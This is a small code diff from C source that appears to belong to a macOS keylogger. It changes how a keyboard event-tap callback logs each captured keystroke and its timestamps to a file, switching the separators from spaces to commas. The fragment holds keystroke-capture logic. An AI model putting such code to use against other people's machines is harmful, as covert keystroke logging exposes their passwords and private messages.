@@ -52,7 +52,7 @@ CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef e
 
     time_t result = time(NULL);
     // This prints the readable key into the log
-    fprintf(logfile, "%s %lld %s", convertKeyCode(keyCode), timeInMilliseconds(), asctime(localtime(&result)));
+    fprintf(logfile, "%s,%lld,%s", convertKeyCode(keyCode), timeInMilliseconds(), asctime(localtime(&result)));
     fflush(logfile);
 
     return event;
